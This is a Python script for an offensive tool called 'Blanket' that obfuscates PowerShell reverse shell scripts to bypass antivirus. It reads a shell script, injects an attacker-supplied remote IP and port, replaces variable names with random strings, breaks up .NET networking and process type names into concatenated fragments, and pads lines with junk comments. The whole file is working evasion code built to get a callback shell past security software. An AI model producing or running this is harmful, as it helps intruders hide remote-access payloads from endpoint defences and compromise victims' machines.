import argparse
import re
import string
import random
import io

parser = argparse.ArgumentParser(description='AV Bypass PowerShell Obfuscation')
parser.add_argument('-i','--IP', help='Enter IP for Remote Host', required=True)
parser.add_argument('-p','--Port', help='Enter Port for Remote Host', required=True)
parser.add_argument('-o','--Outfile', help='Output File Name', required=False)
parser.add_argument('-s','--Script', help='Script To Encode', required=False)
parser.add_argument('-v','--varsize', help='Maximum Variable Size', required=False, type=int)
args = vars(parser.parse_args())

ip= args['IP']
port=args['Port']
#ip="10.10.10.10"
#port="4444"
#scriptloc = "scripts/shell.ps1"
#outfile = "shell"

def logo():
    logo = """


▀█████████▄   ▄█          ▄████████ ███▄▄▄▄      ▄█   ▄█▄    ▄████████     ███     
  ███    ███ ███         ███    ███ ███▀▀▀██▄   ███ ▄███▀   ███    ███ ▀█████████▄ 
  ███    ███ ███         ███    ███ ███   ███   ███▐██▀     ███    █▀     ▀███▀▀██ 
 ▄███▄▄▄██▀  ███         ███    ███ ███   ███  ▄█████▀     ▄███▄▄▄         ███   ▀ 
▀▀███▀▀▀██▄  ███       ▀███████████ ███   ███ ▀▀█████▄    ▀▀███▀▀▀         ███     
  ███    ██▄ ███         ███    ███ ███   ███   ███▐██▄     ███    █▄      ███     
  ███    ███ ███▌    ▄   ███    ███ ███   ███   ███ ▀███▄   ███    ███     ███     
▄█████████▀  █████▄▄██   ███    █▀   ▀█   █▀    ███   ▀█▀   ██████████    ▄████▀   
             ▀                                  ▀                                  


If you are worried about being found perhaps try taking cover under a blanket.
                  https://github.com/warren2i/Blanket
                            For Help Use -h
"""
    return logo
def printinfo():
    print("RHOST = "+ip)
    print("RPORT = " + port)
    print("Script Going Under The Blanket = " + scriptloc)
    print("Output File Name = "+outfile)

if args['Script'] is not None:
     scriptloc= args['Script']
else:
     scriptloc= "scripts/shell.ps1"
if args['Outfile'] is not None:
     outfile = args['Outfile']
else:
     outfile = "scripts/shell.ps1"

if args['varsize'] is not None:
     varsize = args['varsize']
else:
     varsize=10


findvar = re.compile(
    r'(?<=\$)(.*?)(?=[\s,),\.,=,\",\;])')  ## lockback search for $ look forward search for end char or space
vararray = []
randomvararray = []
list = [
    "System.Net.Sockets.TcpClient",
    "System.IO.StreamWriter",
    "System.Byte",
    "System.Text.Encoding",
    "System.Text.AsciiEncoding",
    "System.Diagnostics.Process",
    "System.Text.ASCIIEncoding",
    "Net.Sockets.TCPClient",
    "System.Net.Networkinformation.Ping",
    "PSObject",
    "Net.WebClient",
    "System.Net.HttpListener",
    "Security.Principal.WindowsPrincipal",
    "System.Net.IPEndPoint",
    "TExT.AscIIENcoDINg",
    "io.strEamWritEr"
]
f = open(scriptloc, "rt")
lines = f.readlines()
f.close()
f = open(scriptloc, "rt")

w = open("encoded/"+outfile, "wt")

f.close()


def randomvar ( length ):  ##create a random variable of len length
    letters = string.ascii_letters
    randomvar = (''.join(random.choice(letters) for i in range(length)))  ##creates a random string of length randomlen
    return randomvar


def addcomments ():  ## inserts a comment on each line
    transcript = open("transcripts/rickandmorty.txt", "rt")
    for num, aline in enumerate(transcript, 1):
        #print(num)
        if random.randrange(num):
            continue
        line = aline
        line = re.sub('[\W]', ' ', line)  ## anything that is not a word, replace with whitespace ' '
    return '<# ' + line + ' #>'  ## returns the stripped line with inline comment tags


def breakdatatype ( string, rando ):
    breakdataarr = []
    n = random.randrange(3, 7)  # chunk length
    chunks = [string[i:i + n] for i in range(0, len(string), n)]
    for x in enumerate(chunks):
        breakdataarr.append(['$' + randomvar(rando), x[1]])
    newstring = ("".join('%s' % item[0] for item in breakdataarr))

    return breakdataarr, newstring


varr = []
script = ""
for line in lines:
    lines = findvar.finditer(line)  ##match variables
    for var in lines:  ## loop over variables
        var = var.group(0)  ## pass index of the group, strips what we dont want.
        if var not in vararray:  ## don't populate array with same value twice
            vararray.append('$' + var)  ## add found var to vararray
            randomvararray.append('$' + randomvar(varsize))  ## add random var to randomvar array at matching index

    for x in enumerate(vararray):  ## replace variables with random variables
        script = script.replace(vararray[x[0]], randomvararray[x[0]])
        script = script.replace("10.10.10.10", ip)
        script = script.replace("1337", port)
    for l in list:
        if l in line:
            b = breakdatatype(l, random.randrange(3, varsize))  ## pass string and random length to breakdata function
            # print(line)
            line = line.replace(l, b[1])
            # print(line)
            # print((b[1])+l) ##just to debug
            for a in enumerate(b[0]):
                varr.append((b[0][a[0]][0]) + ' = "' + b[0][a[0]][1] + '"')  ##formats into powershell variable format ie $MUI = "Syst"
    script = script + line
variables = ("\n".join(varr))
script = variables + "\n" + script

s = io.StringIO(script)  ## used to itterate string 'line by line...'
for line in s:
    w.write(line)  ## write line to file
    w.write(addcomments() + '\n')  ## write comment line to file
print(logo())
printinfo()